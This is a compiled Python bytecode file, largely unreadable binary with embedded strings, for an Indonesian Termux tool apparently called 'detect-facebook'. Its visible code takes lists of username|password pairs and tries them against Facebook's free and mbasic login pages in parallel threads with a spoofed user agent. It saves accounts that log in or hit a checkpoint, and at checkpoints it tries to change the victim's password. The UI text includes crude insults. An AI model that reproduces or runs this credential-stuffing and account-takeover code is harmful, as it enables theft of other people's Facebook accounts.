a
    !��`V;  �                   @   s�  d Z dZdZdZdZdZdZdZdZd	Z	d
Z
dZdZdZdZdZdZdZdZdZdZdZ	dZdZed e d e d e Zed e d e d e Zed e d e d e Zed e d e d e Zed e d e d e Zed e d e d e ZdZd Zd!Zd"Zd#Zd$Zd%ad&Zd'Z d(d)l!Z!d(d)l"Z"d(d)l#Z#d(d)l$Z$d(d)l%Z%d(d)l&Z&d(d)l#Z#d(d)l'Z'd(d)l(Z(d(d)l)Z)d(d)l*Z*d(d)l+Z+d(d*l,m-Z. d(d+l/m/Z/ d(d,l)m0Z0 d(d-l$m1Z1 d(d.l&m2Z3 d(d,l)m0Z4 d(d/l(m(Z5 d(d0l(m6Z7 d(d1l&m8Z8 d(d2l#m9Z9 d(d)l$Z$d(d)l:Z:d(d)l%Z%d(d)l&Z&d(d)l#Z#d(d)l'Z'd(d)l;Z;d(d)l(Z(d(d)l)Z)d(d)l*Z*d(d)l<Z<d(d)l,Z=d(d)l+Z+d(d3l(m>Z> d(d*l,m-Z? d(d4l/m@Z@ d(d+l/m/Z/ d(d)l$Z$d(d5l%mAZA d(d*l,m-Z- e/�B� ZCe$�1� ZDd(d)l$ZDd(d)l*Z*d(d)l#Z#d(d5l%mAZE d(d)lFZFd(d)l$Z$d(d)l%Z%d(d)l&Z&d(d)l#Z#d(d)l'Z'd(d)l(Z(d(d)l)Z)d(d)l*Z*d(d)l+Z+d(d)l,Z=d(d+l/m/Z/ d(d,l)m0Z0 d(d-l$m1Z1 d(d)l*Z*d(d)l&Z&d(d)l&Z&d(d2l#m9Z9 d(d)l#Z#d(d)l&Z&d(d)l)Z)d(d)l(Z(d(d.l&m2Z3 d(d,l)m0Z4 d(d/l(m(Z5 d(d0l(m6Z7 d(d1l&m8Z8 d(d2l#m9Z9 d(d)l*Z*d(d)l#Z#d(d)l(Z(d(d)l)Z)d(d)l&Z&d(d)l+Z+zd(d)l$Z$W n eG�yR   e#�9d6� Y n0 zd(d)l%Z%W n eG�y~   e#�9d7� Y n0 d(d)l$ZHd(d,l)m0Z4 d(d5l%mAZI e/�B� ZCd(d)l$Z$d(d)l:Z:d(d)l%Z%d(d)l&Z&d(d)l#Z#d(d)l'Z'd(d)l;Z;d(d)l(Z(d(d)l)Z)d(d)l*Z*d(d)l<Z<d(d)l,Z=d(d)l+Z+eHjJjKeHjJjLeHjJjMfZNd8d9iZOg ZPeD�1� ZQd:ZRe#jS�Td;��rne#jS�Ud;�d(k�rneVd;��W� �X� Zd<d=� ZYd>d?� ZZd@dA� Z[dBdC� Z\dDdE� Z]d\dGdH�Z^dIdJ� Z_dKdL� Z`dMdN� ZadOdP� ZbdQdR� ZcdSdT� ZddUdV� ZId]dXdY�Zed^dZd[�ZfeY�  d)S )_z[00mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz[0;94mz[0;92mz[0;96mz[0;91mz[0;95mz[0;93mz[0;97mz[0;90mz[0;33mz[0;31mz[0;32mz[0;36mz[0;34mz[0;35m�[u   •z] �!�?u   ••z!!z??zMr.RiskyZ6283143565470zsantuyaja019@gmail.comz Https://M.Facebook.Com/llovexnxxzHttps://Github.Com/Dumai-991z0Angga, Yayan, Dapunta, Mr.Risky, Wans And ITSUKIzhttps://free.facebook.comz�Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36ZDumai991�    N��ThreadPoolExecutor)�datetime)�sleep)�Session)�exit)�random)�choice)�stdout)�system)�randint)�date��BeautifulSoupz+python -m pip install requests &> /dev/nullz&python -m pip install bs4 &> /dev/null�
user-agentZchromezhttps://free.facebook.com/�
.useragentc               
   C   sZ  zddd l } dd l } ddlm} ddlm} tj�d�dkrDt�d� tj�d�dkrbt	dd��
�  W n4 ty� } ztdt|� � W Y d }~n
d }~0 0 ttd	 t d
 t d t d � ttd t d
 t d t d � ttd �}|dv �rttd � t�d� t�  n@|dv �r(t�  n.|dv �r:t�  nttd � t�d� t�  d S )Nr   r   r   �resultF�result/cp.txt�azERROR : zBBefore Continue Do you want to use the Default Splitting Distance r   z Y/n  �]zASebelum Lanjut Apakah Anda Mau Menggunakan Jarak Memisah Default z Y/n z	Select : �� � zJangan Kosong Kentod�   )�n�N)�Y�y�Masalah Tidak DiTemukan)�requests�bs4r   �concurrent.futuresr   �os�path�exists�mkdir�open�close�	Exception�print�str�jalan�war�k�p�input�inp�bulat�timer   �
Login_user�kentodxx�kentodx)r"   r   r   �E�x� r;   �</data/data/com.termux/files/home/detect-facebook/detected.pyr6   q   s2    
&$$




r6   c                  C   sr   t td �} | dv r.ttd � t td �} q| �� dkr@t�  tj�| �dkrbttd�	| � � t
| ��� �� S )NzList File : r   zJangan Kosong Kontol�setFzFile {} Ini Tidak DiTemukan)r2   r3   r,   r/   �lower�set_uar%   r&   r'   �formatr)   �read�
splitlines)Zfailr;   r;   r<   �file�   s    rC   c                  C   s�   t tj�d�r&dtd��� ��  d nd� td�} | dv rNt d� td�} q4tdd	��| � t tj�d�rpd
nd� t	d� d S )Nr   z
User Agent Sekarang : �
r   zMasukan User Agent Anda : r   zKosong Mulu KentodzMasukan User Agent : �wz
Suksess Ganti User Agentz
Gagal Ganti User AgnetzJalankan Toolsnya Lagi !!)
r,   r%   r&   r'   r)   rA   �stripr2   �writer
   )�uar;   r;   r<   r?   �   s    ,
r?   c               ,   C   s  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� t� } | �rt	�  t
td � tdd��:}| D ]$}|�d�}|�t|d |d � q�W d   � n1 s�0    Y  nttd � d S )N�clear�
@ �Athour   : �ITSUKI AND RISKY
@ �Fcaebook : �m.facebook.com/llovexnxx
@ �Whatsapp : �wa.me/6283143565470
@ �Group FB : �Termux Indonesia
�  ________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
�               ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
�Gunakan �|� Sebagai Pemisah !!rD   �Hasil �OK �-Detetor Facebook DiSimpan Di : result/ok.txt
�CP �,Detetor Facebook DiSimpan Di : result/cp.txt�1
Login DiMulai
Hasil Loginnya DiSimpan Direquest
r   �Zmax_workersr   �   �Masalah Tidak DiTemukan !!)r%   r   �ngetikr0   �c�ir1   �qrC   �select_methodr,   r   �split�submit�eksekusir
   �m)�	list_akun�su�akunr;   r;   r<   r8   �   sj    
���������������������

8r8   c               ,   C   s0  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� tt	d � t
td �} t� }|�r t�  ttd � tdd��:}|D ]$}|�| �}|�t|d |d � q�W d   � n1 �s0    Y  nttd � d S )NrI   rJ   rK   rL   rM   rN   rO   rP   rQ   rR   rS   rT   rU   rV   rW   rD   rX   rY   rZ   r[   r\   u=   Contoh Pemisah : Username|Password Atau Username • Passwordz
Pemisah : r]   r   r^   r   r_   r`   )r%   r   ra   r0   rb   rc   r1   rd   r.   r/   r2   r3   rC   re   r,   r   rf   rg   rh   r
   ri   )Zpprj   rk   rl   r;   r;   r<   r7   �   sn    
���������������������

:r7   Tc                 C   s�   | r4t d� t td t d � t td t d � ttd t �}|dv rft td � ttd �}qD|d	krttan*|d
kr�t�dd�ant td � td� d S )Nz
 [ Pilih Method Login ]z1.zFree Facebookz2.zMbasic Facebook
z	Method : r   zKosong Mulu Ajg�1�2ZfreeZmbasicr!   F)	r,   r1   r0   r2   rc   ri   �url�replacere   )ZshowZselectr;   r;   r<   re   �   s    re   c              
   C   s�  zt | |�}W n. tjjtjjtjjfy<   t| |� Y n0 |d }d|j�� v r�t	t
d t d t d t d t
 d � t	td t d	�| |� � t	t
d
 � tdd��d�| |�� �n*d|j�� v �r�|j�t�d|d j��d��d�d t�d|d j��d�d d�� t|t|d j��}|dk�r�t	t
d t d t d t d t
 d � t	td t d	�| t� � t	t
d
 � tdd��d�| t�� n�|dk�r t	t
d t d t d t d t
 d � t	td t d	�| |� � t	t
d
 � tdd��d�| |�� nxt	t
d t d t d t d t
 d � t	td �t| |� � t	t
d
 � | td!��� v�r�td!d��d�| |�� nTt	t
d t d t d" t d t
 d � t	td t d	�| |� � t	t
d
 � d S )#Nr   �c_userz==============z>>z Login Success z<<z============u   ⟩⟩z {}|{}z)=========================================zresult/ok.txtr   z{}|{}
Z
checkpointz(https://.*?\.facebook.com)r_   �//�/checkpoint/)�Host�referer�new passwordz====z Successfully Change Password z===zresult/newpass.txt�no change passwordz=====z Failed to Change Password zresult/no_change.txtz=============z ChackPoints z===========u   ⟩⟩ {}{}|{}r   z Login Failed ) �	login_risr"   �
exceptions�ConnectionError�ChunkedEncodingError�ReadTimeoutrh   �cookies�get_dictr,   rd   �urc   rb   r@   r)   rG   �headers�update�re�searchro   �grouprf   �tahap1�parser�textr1   �newpassr0   rA   ri   )�username�password�respons�session�responr;   r;   r<   rh   �   s>    ,H
,
,,,rh   c                 K   s�   t �� }t|�td �j�}t|d�}|�| |d�� d|v rD|d= |j�t�	d�d ddt
d	d
ddtd td�
� |jtt|� |d�}||fS )Nz/login/?next&ref=dbl&fl&refid=8Zsign_up)Zemail�passZ_fb_noscriptrr   r_   z	max-age=0rm   z!application/x-www-form-urlencodedz|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zgzip, deflatez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)
rt   zcache-controlzupgrade-insecure-requestsr   zcontent-typeZacceptzaccept-encodingzaccept-languageru   �origin��data)r"   r�   r�   �getro   r�   �get_datar�   r�   rf   �	useragent�post�
get_action)r�   r�   �kwargsr�   �parsingr�   r;   r;   r<   rx     s    
0rx   c                 C   s�   t |d�}d|v r�|d= z,| j| jd �d�d t|� |d�j}W n tjjy^   d}Y n0 d	|v std
|�	� v r�t
| t|��S d| j�� v r�dS d S )N�"submit[logout-button-with-confirm]zsubmit[Yes]z
submit[No]ru   rs   r   r�   Zkontol�password_newzbuat kata sandi barurq   rw   )r�   r�   r�   rf   r�   r�   r"   ry   ZTooManyRedirectsr>   �tahap2r�   r}   r~   )r�   r�   r�   r�   r;   r;   r<   r�   !  s    
,
r�   c                 C   sV   t |d�}|�dti� | j| jd �d�d t|� |dd�}d|j�� v rRd	S d S )
Nr�   r�   ru   rs   r   F)r�   Zallow_redirectsrq   rv   )	r�   r�   r�   r�   r�   rf   r�   r}   r~   )r�   r�   r�   r�   r;   r;   r<   r�   .  s
    
(r�   c                 K   sB   | � dddd��D ]*}||d v r&qq|�|d |d i� q|S )Nr2   T)�name�valuer�   r�   )Zfind_allr�   )r�   Zkecualir�   Zlnputr;   r;   r<   r�   5  s    r�   c                 C   s   | � dddi�d S )NZform�methodr�   Zaction)�find)r�   r;   r;   r<   r�   ;  s    r�   c                 C   s
   t | d�S )Nzhtml.parserr   )Zhtmlr;   r;   r<   r�   >  s    r�   �����Mb`?c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S �NrD   ��sysr   rG   �flushr   �ZkataZjumr:   r;   r;   r<   ra   A  s    
ra   c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S r�   r�   r�   r;   r;   r<   r.   F  s    
r.   )T)r�   )r�   )grd   Zh2Zb2Zc2Zi2Zu2Zm2Zp2Zk2�brc   rb   ri   r   r0   r1   �h�or4   r/   r3   Zbulat2Zwar2Zinp2�meZno_meZemail_meZfacebook_meZ	github_meZteamro   r�   r�   Z	itertoolsZ	threadingr%   r"   r#   r�   �
subprocessr   r5   r�   Zjsonr$   r   ZYayanGantengr   r   r	   r
   ZkeluarZwaktuZacakr   Zpilihr   r   Z	mechanizeZuuid�base64Z
concurrentr   Z
ThreadPoolr   r   ZnowZcurrent�rZpar�platform�ModuleNotFoundErrorZreqr�   ry   rz   r{   r|   Zkoneksi_errorrH   ZprvtZsesZlinkr&   r'   �getsizer)   rA   rF   r6   rC   r?   r8   r7   re   rh   rx   r�   r�   r�   r�   ra   r.   r;   r;   r;   r<   �<module>   s�   `hH  h
!
#

